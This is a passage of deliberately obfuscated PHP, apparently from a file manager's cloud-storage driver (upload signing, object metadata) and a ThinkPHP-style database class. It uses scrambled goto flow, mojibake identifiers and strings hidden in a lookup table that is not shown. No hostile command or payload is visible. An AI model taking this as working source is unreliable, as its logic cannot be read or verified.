$Eéƒ‰™š¹‘); } public function fileOutImageServer($D•„ãî™ŠÀ, $b¦Øí•­àÚ = 250) { parent::fileOutImage($D•„ãî™ŠÀ, $b¦Øí•­àÚ); } public function hashMd5($DÛËÆ ×ÍÛ, $e§ğ‡Œœ¼ = '') { $D˜‚¦èñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Dò†ëÍåÙ = $this->objectMeta($DÛËÆ ×ÍÛ); if (!$Dò†ëÍåÙ) { return !1; } $e§ğ‡Œœ¼ = $e§ğ‡Œœ¼ ? $e§ğ‡Œœ¼ : _get($Dò†ëÍåÙ, $D˜‚¦èñ[219]); $e§ğ‡Œœ¼ = $e§ğ‡Œœ¼ ? $e§ğ‡Œœ¼ : _get($Dò†ëÍåÙ, $D˜‚¦èñ[209], $D˜‚¦èñ[43]); return $e§ğ‡Œœ¼; } public function uploadFormData($A‹©ù•¡™—, $d»§™¯™ôÕ = 3600) { $a‘ßÈ©ËŒ¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¥™Ü®á¤® = $this->pathFather($A‹©ù•¡™—); $f… ¿½éÒ‡ = $this->client->getHttpUploadPostParams($this->bucket, $B¥™Ü®á¤®, $a‘ßÈ©ËŒ¢[197], $d»§™¯™ôÕ); return array_merge((array) $f… ¿½éÒ‡, array($a‘ßÈ©ËŒ¢[181] => $this->getHost())); } public function multiUploadFormData($A‹”Æ¡Ú´‹, $dÎ„Ûêµ¤ = 3600) { $F”‡ÏİØæ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F¯‹¤ÛĞÏ§ = gmdate($F”‡ÏİØæ[220]); $DäòÄ…Û¬® = array(); $Bšº¼®½ = $this->client->getUploadId($this->bucket, $A‹”Æ¡Ú´‹, $DäòÄ…Û¬®); if (!$Bšº¼®½) { return !1; } return array($F”‡ÏİØæ[221] => $Bšº¼®½, $F”‡ÏİØæ[181] => $this->getHost() . $F”‡ÏİØæ[18] . $this->pathEncode($A‹”Æ¡Ú´‹), $F”‡ÏİØæ[222] => $F¯‹¤ÛĞÏ§, $F”‡ÏİØæ[101] => $A‹”Æ¡Ú´‹); } public function multiUploadAuthData($aİ¨èÉÃç’, $f“×·É¿¯¤ = array()) { goto Dìé–ãéíÈ; dò­¾Ï¥ø: $AçĞ‹ƒÓ¨ = $f“×·É¿¯¤[$e¸”å’—¥Ô[101]]; unset($f“×·É¿¯¤[$e¸”å’—¥Ô[101]]); if (isset($f“×·É¿¯¤[$e¸”å’—¥Ô[223]])) { $f“×·É¿¯¤[$e¸”å’—¥Ô[222]] = $d¾ãÓˆ´Ê; return $this->listUploadParts($AçĞ‹ƒÓ¨, $f“×·É¿¯¤); } goto b®ÊÓä·ƒ; CŞ„²ÎÎŒ: $bàÒò§Åì° = implode($e¸”å’—¥Ô[10], $DŒø‡íŒï); $Bİ¿îËö²¥ = base64_encode(hash_hmac($e¸”å’—¥Ô[229], $bàÒò§Åì°, $this->secret, !0)); $C¢î¹²ªäö = $e¸”å’—¥Ô[230] . $this->accessKey . $e¸”å’—¥Ô[14] . $Bİ¿îËö²¥; goto aÙæ…Ú¤‹·; Dìé–ãéíÈ: $e¸”å’—¥Ô =& $_SERVER[¹÷ˆ§éÒ°ú]; $d¾ãÓˆ´Ê = isset($f“×·É¿¯¤[$e¸”å’—¥Ô[222]]) ? $f“×·É¿¯¤[$e¸”å’—¥Ô[222]] : gmdate($e¸”å’—¥Ô[220]); $Fëè„ÓŞ¡ = isset($f“×·É¿¯¤[$e¸”å’—¥Ô[172]]) ? $f“×·É¿¯¤[$e¸”å’—¥Ô[172]] : $e¸”å’—¥Ô[43]; goto dò­¾Ï¥ø; b®ÊÓä·ƒ: $DŒø‡íŒï = array($e¸”å’—¥Ô[224], $e¸”å’—¥Ô[43], $e¸”å’—¥Ô[128], $e¸”å’—¥Ô[43], "\x78\x2d\x61\155\172\x2d\x64\x61\x74\145\x3a{$d¾ãÓˆ´Ê}", $e¸”å’—¥Ô[18] . $this->bucket . $e¸”å’—¥Ô[18] . $this->pathEncode($AçĞ‹ƒÓ¨) . $Fëè„ÓŞ¡); if (strpos($Fëè„ÓŞ¡, $e¸”å’—¥Ô[225]) === 0) { $DŒø‡íŒï[0] = $e¸”å’—¥Ô[226]; } if (isset($f“×·É¿¯¤[$e¸”å’—¥Ô[227]]) && $f“×·É¿¯¤[$e¸”å’—¥Ô[227]] == $e¸”å’—¥Ô[228]) { $DŒø‡íŒï[0] = $e¸”å’—¥Ô[228]; } goto CŞ„²ÎÎŒ; aÙæ…Ú¤‹·: if (strpos($Fëè„ÓŞ¡, $e¸”å’—¥Ô[225]) === 0) { return array($e¸”å’—¥Ô[231] => $C¢î¹²ªäö, $e¸”å’—¥Ô[222] => $d¾ãÓˆ´Ê); } return $C¢î¹²ªäö; goto BÕ‰èÖôÃõ; BÕ‰èÖôÃõ: } public function listUploadParts($Aô†¬ŒãÛö, $BçÌ¿ŸÃÄ× = array()) { goto F«çÃ–øè; A©İèö‚–: $f“‘™ø¼æ¡ = $this->multiUploadAuthData($Aô†¬ŒãÛö, $BçÌ¿ŸÃÄ×); if (empty($f“‘™ø¼æ¡)) { return !1; } return array($d´¦è÷ñÑò[231] => $f“‘™ø¼æ¡, $d´¦è÷ñÑò[222] => $BçÌ¿ŸÃÄ×[$d´¦è÷ñÑò[222]], $d´¦è÷ñÑò[233] => $cËíõ´ÄªÎ); goto D©¬Ï¶®Á; EÊÛÖİªâÃ: if (!$cËíõ´ÄªÎ) { return !1; } unset($BçÌ¿ŸÃÄ×[$d´¦è÷ñÑò[223]], $BçÌ¿ŸÃÄ×[$d´¦è÷ñÑò[227]]); $BçÌ¿ŸÃÄ×[$d´¦è÷ñÑò[101]] = $Aô†¬ŒãÛö; goto A©İèö‚–; F«çÃ–øè: $d´¦è÷ñÑò =& $_SERVER[¹÷ˆ§éÒ°ú]; $Eµâ™ŠºÖš = str_replace($d´¦è÷ñÑò[232], $d´¦è÷ñÑò[43], $BçÌ¿ŸÃÄ×[$d´¦è÷ñÑò[172]]); $cËíõ´ÄªÎ = $this->client->listParts($this->bucket, $Aô†¬ŒãÛö, $Eµâ™ŠºÖš); goto EÊÛÖİªâÃ; D©¬Ï¶®Á: } public function getHost() { return parent::getHost() . $_SERVER[¹÷ˆ§éÒ°ú][18] . $this->bucket; } public function size($AòÁ„’ôî) { $BĞè¨¬´İ = $this->objectMeta($AòÁ„’ôî); return $BĞè¨¬´İ ? $BĞè¨¬´İ[$_SERVER[¹÷ˆ§éÒ°ú][89]] : 0; } public function info($F¸ÍÒ›í·«) { if ($this->isFolder($F¸ÍÒ›í·«)) { return $this->folderInfo($F¸ÍÒ›í·«); } else { if ($this->isFile($F¸ÍÒ›í·«)) { return $this->fileInfo($F¸ÍÒ›í·«); } } return !1; } public function exist($bâ…åóè±) { return $this->isFile($bâ…åóè±) || $this->isFolder($bâ…åóè±); } public function isFile($C‹İ×Ùˆ«·) { return !$this->isFolder($C‹İ×Ùˆ«·) && $this->objectMeta($C‹İ×Ùˆ«·); } public function isFolder($BÑùïÒšÖÂ) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][234], $BÑùïÒšÖÂ); } protected function objectMeta($B’ä‘Û¹¤Ş) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][235], $B’ä‘Û¹¤Ş); } protected function _objectMeta($eÌšÑè¼õ) { $C‘¶‰ ÒÔ¤ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÌšÑè¼õ = rtrim($eÌšÑè¼õ, $C‘¶‰ ÒÔ¤[18]); try { $B™£‹ó­¡Å = $this->client->getObjectInfo($this->bucket, $eÌšÑè¼õ); if (!isset($B™£‹ó­¡Å[$C‘¶‰ ÒÔ¤[219]]) && isset($B™£‹ó­¡Å[$C‘¶‰ ÒÔ¤[236]])) { $B™£‹ó­¡Å[$C‘¶‰ ÒÔ¤[219]] = $B™£‹ó­¡Å[$C‘¶‰ ÒÔ¤[236]]; } } catch (Exception $c‡ªÁØ×£) { $B™£‹ó­¡Å = !1; } if (!$B™£‹ó­¡Å) { } return $B™£‹ó­¡Å; } protected function _isFolder($a“Ğ²ˆ¨) { goto DùÆÄã ÈÊ; fäïÏ°Œƒ: if (substr($eƒ³²ØÁó[0][$Fò˜·­ïÙ¼[38]], -1) == $Fò˜·­ïÙ¼[18]) { return !0; } if (get_path_this($eƒ³²ØÁó[0][$Fò˜·­ïÙ¼[38]]) == get_path_this($a“Ğ²ˆ¨)) { return !1; } return !0; goto dªñªµ•‚”; DùÆÄã ÈÊ: $Fò˜·­ïÙ¼ =& $_SERVER[¹÷ˆ§éÒ°ú]; $a“Ğ²ˆ¨ = rtrim($a“Ğ²ˆ¨, $Fò˜·­ïÙ¼[18]); if ($a“Ğ²ˆ¨ == $Fò˜·­ïÙ¼[43] || $a“Ğ²ˆ¨ == $Fò˜·­ïÙ¼[18]) { return !0; } goto Fø¶³Şíó; Fø¶³Şíó: $eƒ³²ØÁó = $this->client->getBucket($this->bucket, $a“Ğ²ˆ¨, null, 1); if (empty($eƒ³²ØÁó)) { return !1; } $eƒ³²ØÁó = array_values($eƒ³²ØÁó); goto fäïÏ°Œƒ; dªñªµ•‚”: } } goto B ›²î¤·á; cÕ‰ì•æ•‘: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\161" => "\74\76", "\147\x74" => "\x3e", "\x65\x67\164" => "\76\75", "\x6c\x74" => "\74", "\x65\x6c\164" => "\74\x3d", "\156\157\164\x6c\151\x6b\145" => "\116\117\x54\x20\114\111\113\105", "\154\151\153\x65" => "\x4c\x49\113\x45", "\151\156" => "\111\x4e", "\156\157\x74\x69\x6e" => "\116\x4f\124\40\111\x4e", "\x6e\x6f\164\x20\151\156" => "\116\117\124\40\111\x4e", "\142\145\164\x77\145\x65\x6e" => "\102\105\x54\127\x45\x45\116", "\x6e\x6f\x74\142\145\x74\167\145\x65\156" => "\x4e\x4f\x54\40\102\x45\124\x57\105\x45\x4e", "\x6e\157\x74\40\x62\145\164\167\145\145\x6e" => "\116\x4f\x54\x20\102\x45\x54\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\114\x45\x43\124\x25\104\111\x53\124\x49\x4e\x43\x54\45\40\x25\106\111\x45\x4c\x44\x25\x20\x46\x52\x4f\115\40\45\124\x41\x42\x4c\x45\45\45\112\117\x49\x4e\x25\x25\x57\x48\x45\122\105\45\45\107\122\117\125\x50\45\x25\110\x41\x56\111\116\107\x25\x25\117\122\104\x45\x52\45\x25\x4c\x49\x4d\x49\124\x25\40\45\125\x4e\111\117\x4e\x25\x25\103\x4f\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $Cãùš¶„×ï = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹÷ˆ§éÒ°ú][865], $Cãùš¶„×ï); } public function factory($cß¾ŠÙĞÚª = '') { goto câ„äì½ôğ; aí÷Òî¶«ß: $this->dbType = ucwords(strtolower($cß¾ŠÙĞÚª[$AÃøò¹ª¸ì[866]])); $d×ª…ùˆâ¡ = $AÃøò¹ª¸ì[868] . $this->dbType; if (class_exists($d×ª…ùˆâ¡)) { $bš©Í¬ùŠ› = new $d×ª…ùˆâ¡($cß¾ŠÙĞÚª); if ($AÃøò¹ª¸ì[718] != strtolower($cß¾ŠÙĞÚª[$AÃøò¹ª¸ì[866]])) { $bš©Í¬ùŠ›->dbType = strtoupper($this->dbType); } else { $bš©Í¬ùŠ›->dbType = $this->_getDsnType($cß¾ŠÙĞÚª[$AÃøò¹ª¸ì[818]]); } } else { think_exception(think_lang($AÃøò¹ª¸ì[869]) . $AÃøò¹ª¸ì[870] . $d×ª…ùˆâ¡); } goto DÚÕ¶á‰Ú; câ„äì½ôğ: $AÃøò¹ª¸ì =& $_SERVER[¹÷ˆ§éÒ°ú]; $cß¾ŠÙĞÚª = $this->parseConfig($cß¾ŠÙĞÚª); if (empty($cß¾ŠÙĞÚª[$AÃøò¹ª¸ì[866]])) { think_exception(think_lang($AÃøò¹ª¸ì[867])); } goto aí÷Òî¶«ß; DÚÕ¶á‰Ú: return $bš©Í¬ùŠ›; goto dñ“ƒŒã²¡; dñ“ƒŒã²¡: } public function __call($a’­¡µ£Ğ®, $FœÔ °–‹‘) { if (method_exists($this, $a’­¡µ£Ğ®)) { return call_user_func_array(array($this, $a’­¡µ£Ğ®), $FœÔ °–‹‘); } } protected function _getDsnType($FÍœ¿ŠŠÚ) { $f¸•¥‚¶ò = explode($_SERVER[¹÷ˆ§éÒ°ú][14], $FÍœ¿ŠŠÚ); $E‚à•Ë„À– = strtoupper(trim($f¸•¥‚¶ò[0])); return $E‚à•Ë„À–; } private function parseConfig($C¬Ø‰ Öô¬ = '') { $aÖçáÆ—é“ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!empty($C¬Ø‰ Öô¬) && is_string($C¬Ø‰ Öô¬)) { $C¬Ø‰ Öô¬ = $this->parseDSN($C¬Ø‰ Öô¬); } elseif (is_array($C¬Ø‰ Öô¬)) { $C¬Ø‰ Öô¬ = array_change_key_case($C¬Ø‰ Öô¬); $C¬Ø‰ Öô¬ = array($aÖçáÆ—é“[866] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[717]], $aÖçáÆ—é“[791] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[871]], $aÖçáÆ—é“[792] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[872]], $aÖçáÆ—é“[789] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[873]], $aÖçáÆ—é“[790] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[874]], $aÖçáÆ—é“[27] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[875]], $aÖçáÆ—é“[818] => $C¬Ø‰ Öô¬[$aÖçáÆ—é“[719]], $aÖçáÆ—é“[23] => isset($C¬Ø‰ Öô¬[$aÖçáÆ—é“[876]]) ? $C¬Ø‰ Öô¬[$aÖçáÆ—é“[876]] : array()); } elseif (empty($C¬Ø‰ Öô¬)) { if (think_config($aÖçáÆ—é“[877]) && $aÖçáÆ—é“[718] != strtolower(think_config($aÖçáÆ—é“[878]))) { $C¬Ø‰ Öô¬ = $this->parseDSN(think_config($aÖçáÆ—é“[877])); } else { $C¬Ø‰ Öô¬ = array($aÖçáÆ—é“[866] => think_config($aÖçáÆ—é“[878]), $aÖçáÆ—é“[791] => think_config($aÖçáÆ—é“[879]), $aÖçáÆ—é“[792] => think_config($aÖçáÆ—é“[880]), $aÖçáÆ—é“[789] => think_config($aÖçáÆ—é“[881]), $aÖçáÆ—é“[790] => think_config($aÖçáÆ—é“[882]), $aÖçáÆ—é“[27] => think_config($aÖçáÆ—é“[245]), $aÖçáÆ—é“[818] => think_config($aÖçáÆ—é“[877]), $aÖçáÆ—é“[23] => think_config($aÖçáÆ—é“[883])); } } return $C¬Ø‰ Öô¬; } protected function initConnect($E¡ğÙŞ£ˆá = true) { if (1 == think_config($_SERVER[¹÷ˆ§éÒ°ú][28])) { $this->_linkID = $this->multiConnect($E¡ğÙŞ£ˆá); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($FŒñó¶ç°é = false) { $Fõó¤ì‘šã =& $_SERVER[¹÷ˆ§éÒ°ú]; static $e…’Šçº¢ = array(); if (empty($e…’Šçº¢)) { foreach ($this->config as $B®•·İŠ => $a»ìñÉÍ©—) { $e…’Šçº¢[$B®•·İŠ] = explode($Fõó¤ì‘šã[57], $a»ìñÉÍ©—); } } if (think_config($Fõó¤ì‘šã[884])) { if ($FŒñó¶ç°é) { $cŒªªö•¾÷ = floor(mt_rand(0, think_config($Fõó¤ì‘šã[885]) - 1)); } else { if (is_numeric(think_config($Fõó¤ì‘šã[886]))) { $cŒªªö•¾÷ = think_config($Fõó¤ì‘šã[886]); } else { $cŒªªö•¾÷ = floor(mt_rand(think_config($Fõó¤ì‘šã[885]), count($e…’Šçº¢[$Fõó¤ì‘šã[789]]) - 1)); } } } else { $cŒªªö•¾÷ = floor(mt_rand(0, count($e…’Šçº¢[$Fõó¤ì‘šã[789]]) - 1)); } $Døàè´ÄÚ = array($Fõó¤ì‘šã[791] => isset($e…’Šçº¢[$Fõó¤ì‘šã[791]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[791]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[791]][0], $Fõó¤ì‘šã[792] => isset($e…’Šçº¢[$Fõó¤ì‘šã[792]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[792]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[792]][0], $Fõó¤ì‘šã[789] => isset($e…’Šçº¢[$Fõó¤ì‘šã[789]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[789]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[789]][0], $Fõó¤ì‘šã[790] => isset($e…’Šçº¢[$Fõó¤ì‘šã[790]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[790]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[790]][0], $Fõó¤ì‘šã[27] => isset($e…’Šçº¢[$Fõó¤ì‘šã[27]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[27]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[27]][0], $Fõó¤ì‘šã[818] => isset($e…’Šçº¢[$Fõó¤ì‘šã[818]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[818]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[818]][0], $Fõó¤ì‘šã[23] => isset($e…’Šçº¢[$Fõó¤ì‘šã[23]][$cŒªªö•¾÷]) ? $e…’Šçº¢[$Fõó¤ì‘šã[23]][$cŒªªö•¾÷] : $e…’Šçº¢[$Fõó¤ì‘šã[23]][0]); return $this->connect($Døàè´ÄÚ, $cŒªªö•¾÷); } public function parseDSN($Fœ«Œ±µ„ß) { $Eàå¦ÖÀÕ™ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($Fœ«Œ±µ„ß)) { return !1; } $d¬¡„ñ›‡à = parse_url($Fœ«Œ±µ„ß); if ($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[180]]) { $cƒÑ·–ææŞ = array($Eàå¦ÖÀÕ™[866] => $d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[180]], $Eàå¦ÖÀÕ™[791] => isset($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[548]]) ? $d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[548]] : $Eàå¦ÖÀÕ™[43], $Eàå¦ÖÀÕ™[792] => isset($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[887]]) ? $d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[887]] : $Eàå¦ÖÀÕ™[43], $Eàå¦ÖÀÕ™[789] => isset($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[181]]) ? $d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[181]] : $Eàå¦ÖÀÕ™[43], $Eàå¦ÖÀÕ™[790] => isset($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[182]]) ? $d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[182]] : $Eàå¦ÖÀÕ™[43], $Eàå¦ÖÀÕ™[27] => isset($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[87]]) ? substr($d¬¡„ñ›‡à[$Eàå¦ÖÀÕ™[87]], 1) : $Eàå¦ÖÀÕ™[43]); } else { preg_match($Eàå¦ÖÀÕ™[888], trim($Fœ«Œ±µ„ß), $f‹ñ‡ùœšÎ); $cƒÑ·–ææŞ = array($Eàå¦ÖÀÕ™[866] => $f‹ñ‡ùœšÎ[1], $Eàå¦ÖÀÕ™[791] => $f‹ñ‡ùœšÎ[2], $Eàå¦ÖÀÕ™[792] => $f‹ñ‡ùœšÎ[3], $Eàå¦ÖÀÕ™[789] => $f‹ñ‡ùœšÎ[4], $Eàå¦ÖÀÕ™[790] => $f‹ñ‡ùœšÎ[5], $Eàå¦ÖÀÕ™[27] => $f‹ñ‡ùœšÎ[6]); } $cƒÑ·–ææŞ[$Eàå¦ÖÀÕ™[818]] = $Eàå¦ÖÀÕ™[43]; return $cƒÑ·–ææŞ; } protected function debug() { $b¼øµÎÛã =& $_SERVER[¹÷ˆ§éÒ°ú]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $b¼øµÎÛã[889]; if (think_config($b¼øµÎÛã[890])) { think_status($b¼øµÎÛã[891]); think_trace($this->queryStr . $b¼øµÎÛã[892] . think_status($b¼øµÎÛã[30], $b¼øµÎÛã[891], 6) . $b¼øµÎÛã[893], $b¼øµÎÛã[43], $b¼øµÎÛã[894]); } } protected function parseLock($bô·½‹×Š¸ = false) { $e¼»ğôƒåĞ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$bô·½‹×Š¸) { return $e¼»ğôƒåĞ[43]; } if ($e¼»ğôƒåĞ[820] == $this->dbType) { return $e¼»ğôƒåĞ[895]; } return $e¼»ğôƒåĞ[896]; } protected function parseSet($EššÓÎˆë£) { $c’åğ‰ó˜Ç =& $_SERVER[¹÷ˆ§éÒ°ú]; foreach ($EššÓÎˆë£ as $C‡ó®ŠÒ => $dçëõ©Îˆ) { if (is_array($dçëõ©Îˆ) && $c’åğ‰ó˜Ç[296] == $dçëõ©Îˆ[0]) { $bµ¿Ë’»›á[] = $this->parseKey($C‡ó®ŠÒ) . $c’åğ‰ó˜Ç[897] . $dçëõ©Îˆ[1]; } elseif (is_scalar($dçëõ©Îˆ) || is_null($dçëõ©Îˆ)) { $bµ¿Ë’»›á[] = $this->parseKey($C‡ó®ŠÒ) . $c’åğ‰ó˜Ç[897] . $this->parseValue($dçëõ©Îˆ); } } return $c’åğ‰ó˜Ç[898] . implode($c’åğ‰ó˜Ç[57], $bµ¿Ë’»›á); } protected function bindParam($f…ÁåÔ¦‰¦, $Cï¬áö‘…) { $this->bind[$_SERVER[¹÷ˆ§éÒ°ú][14] . $f…ÁåÔ¦‰¦] = $Cï¬áö‘…; } protected function parseBind($AÆ×òÛÏäÃ) { $AÆ×òÛÏäÃ = array_merge($this->bind, $AÆ×òÛÏäÃ); $this->bind = array(); return $AÆ×òÛÏäÃ; } function parseKey(&$AÆ¶–×Ö‘á, $AçáÇ•ùß = true) { if ($AçáÇ•ùß) { $AÆ¶–×Ö‘á = $this->parseKeyCheck($AÆ¶–×Ö‘á); } return $AÆ¶–×Ö‘á; } function parseKeyCheck($C™ÂÔâÑÁ) { $DñÑ¯ÈÏøƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C™ÂÔâÑÁ = trim($C™ÂÔâÑÁ); if (!preg_match($DñÑ¯ÈÏøƒ[899], $C™ÂÔâÑÁ)) { think_exception($DñÑ¯ÈÏøƒ[900] . $C™ÂÔâÑÁ); } return $C™ÂÔâÑÁ; } protected function parseValue($cŠ°†’ğ‰Š) { $fŠË±º„ö§ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_string($cŠ°†’ğ‰Š)) { $cŠ°†’ğ‰Š = $fŠË±º„ö§[859] . $this->escapeString($cŠ°†’ğ‰Š) . $fŠË±º„ö§[859]; } elseif (isset($cŠ°†’ğ‰Š[0]) && is_string($cŠ°†’ğ‰Š[0]) && strtolower($cŠ°†’ğ‰Š[0]) == $fŠË±º„ö§[296]) { $cŠ°†’ğ‰Š = $this->escapeString($cŠ°†’ğ‰Š[1]); } elseif (is_array($cŠ°†’ğ‰Š)) { $cŠ°†’ğ‰Š = array_map(array($this, $fŠË±º„ö§[860]), $cŠ°†’ğ‰Š); } elseif (is_bool($cŠ°†’ğ‰Š)) { $cŠ°†’ğ‰Š = $cŠ°†’ğ‰Š ? $fŠË±º„ö§[95] : $fŠË±º„ö§[481]; } elseif (is_null($cŠ°†’ğ‰Š)) { $cŠ°†’ğ‰Š = $fŠË±º„ö§[111]; } return $cŠ°†’ğ‰Š; } protected function parseField($C™½Û­ÖÃæ) { $ešø¯›ÀÆ¹ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_string($C™½Û­ÖÃæ) && strpos($C™½Û­ÖÃæ, $ešø¯›ÀÆ¹[57])) { $C™½Û­ÖÃæ = explode($ešø¯›ÀÆ¹[57], $C™½Û­ÖÃæ); } if (is_array($C™½Û­ÖÃæ)) { $eœÖ¹£»»Î = array(); foreach ($C™½Û­ÖÃæ as $f«öï¯¬ÕŒ => $e¨´· ì) { if (!is_numeric($f«öï¯¬ÕŒ)) { $eœÖ¹£»»Î[] = $this->parseKey($f«öï¯¬ÕŒ) . $ešø¯›ÀÆ¹[901] . $this->parseKey($e¨´· ì); } else { $eœÖ¹£»»Î[] = $this->parseKey($e¨´· ì); } } $B¤¿İÊè = implode($ešø¯›ÀÆ¹[57], $eœÖ¹£»»Î); } elseif (is_string($C™½Û­ÖÃæ) && !empty($C™½Û­ÖÃæ)) { $B¤¿İÊè = $C™½Û­ÖÃæ; } else { $B¤¿İÊè = $ešø¯›ÀÆ¹[188]; } return $B¤¿İÊè; } protected function parseTable($b¶ÈˆÌÀšã) { $Dğ Ç™¶™ø =& $_SERVER[¹÷ˆ§éÒ°ú]; if (is_array($b¶ÈˆÌÀšã)) { $D¿õË›ğ•“ = array(); foreach ($b¶ÈˆÌÀšã as $a‡‡Åà‰ê => $FñŒ®´ˆ£) { if (!is_numeric($a‡‡Åà‰ê)) { $D¿õË›ğ•“[] = $this->parseKey($a‡‡Åà‰ê) . $Dğ Ç™¶™ø[60] . $this->parseKey($FñŒ®´ˆ£); } else { $D¿õË›ğ•“[] = $this->parseKey($a‡‡Åà‰ê); } } $b¶ÈˆÌÀšã = $D¿õË›ğ•“; } elseif (is_string($b¶ÈˆÌÀšã)) { if (strstr($b¶ÈˆÌÀšã, $Dğ Ç™¶™ø[60])) { return $b¶ÈˆÌÀšã; } $b¶ÈˆÌÀšã = explode($Dğ Ç™¶™ø[57], $b¶ÈˆÌÀšã); array_walk($b¶ÈˆÌÀšã, array($this, $Dğ Ç™¶™ø[808])); } return $Dğ Ç™¶™ø[902] . trim(implode($Dğ Ç™¶™ø[903], $b¶ÈˆÌÀšã), $Dğ Ç™¶™ø[814]) . $Dğ Ç™¶™ø[902]; } protected function parseWhere($c°‹éº») { $bÈ»„ãáŞ× =& $_SERVER[¹÷ˆ§éÒ°ú]; $d”Ôº…íê = $bÈ»„ãáŞ×[43]; if (is_string($c°‹éº»)) { $d”Ôº…íê = $c°‹éº»; } else { $eÄá·Òè­ñ = isset($c°‹éº»[$bÈ»„ãáŞ×[904]]) ? strtoupper($c°‹éº»[$bÈ»„ãáŞ×[904]]) : $bÈ»„ãáŞ×[43]; if (in_array($eÄá·Òè­ñ, array($bÈ»„ãáŞ×[905], $bÈ»„ãáŞ×[906], $bÈ»„ãáŞ×[907]))) { $eÄá·Òè­ñ = $bÈ»„ãáŞ×[60] . $eÄá·Òè­ñ . $bÈ»„ãáŞ×[60]; unset($c°‹éº»[$bÈ»„ãáŞ×[904]]); } else { $eÄá·Òè­ñ = $bÈ»„ãáŞ×[908]; } foreach ($c°‹éº» as $a˜äôâ»ğ => $f—ÍŞ¾ë²) { $d”Ôº…íê .= $bÈ»„ãáŞ×[276]; if (is_numeric($a˜äôâ»ğ)) { $a˜äôâ»ğ = $bÈ»„ãáŞ×[909]; } if (0 === strpos($a˜äôâ»ğ, $bÈ»„ãáŞ×[82])) { $d”Ôº…íê .= $this->parseThinkWhere($a˜äôâ»ğ, $f—ÍŞ¾ë²); } else { if (!preg_match($bÈ»„ãáŞ×[910], trim($a˜äôâ»ğ))) { think_exception(think_lang($bÈ»„ãáŞ×[911]) . $bÈ»„ãáŞ×[14] . $a˜äôâ»ğ); } $F×Í­Ë¬÷Ÿ = is_array($f—ÍŞ¾ë²) && isset($f—ÍŞ¾ë²[$bÈ»„ãáŞ×[912]]); $a˜äôâ»ğ = trim($a˜äôâ»ğ); if (strpos($a˜äôâ»ğ, $bÈ»„ãáŞ×[282])) { $E‚Ğ§‘·ˆ = explode($bÈ»„ãáŞ×[282], $a˜äôâ»ğ); $e¦Œí×ö‹ = array(); foreach ($E‚Ğ§‘·ˆ as $Bî¾áÔµ õ => $Fò×ŒÖ) { $DÊç±‚ÈØ¦ = $F×Í­Ë¬÷Ÿ ? $f—ÍŞ¾ë²[$Bî¾áÔµ õ] : $f—ÍŞ¾ë²; $e¦Œí×ö‹[] = $bÈ»„ãáŞ×[259] . $this->parseWhereItem($this->parseKey($Fò×ŒÖ), $DÊç±‚ÈØ¦) . $bÈ»„ãáŞ×[807]; } $d”Ôº…íê .= implode($bÈ»„ãáŞ×[913], $e¦Œí×ö‹); } elseif (strpos($a˜äôâ»ğ, $bÈ»„ãáŞ×[283])) { $E‚Ğ§‘·ˆ = explode($bÈ»„ãáŞ×[283], $a˜äôâ»ğ); $e¦Œí×ö‹ = array(); foreach ($E‚Ğ§‘·ˆ as $Bî¾áÔµ õ => $Fò×ŒÖ) { $DÊç±‚ÈØ¦ = $F×Í­Ë¬÷Ÿ ? $f—ÍŞ¾ë²[$Bî¾áÔµ õ] : $f—ÍŞ¾ë²; $e¦Œí×ö‹[] = 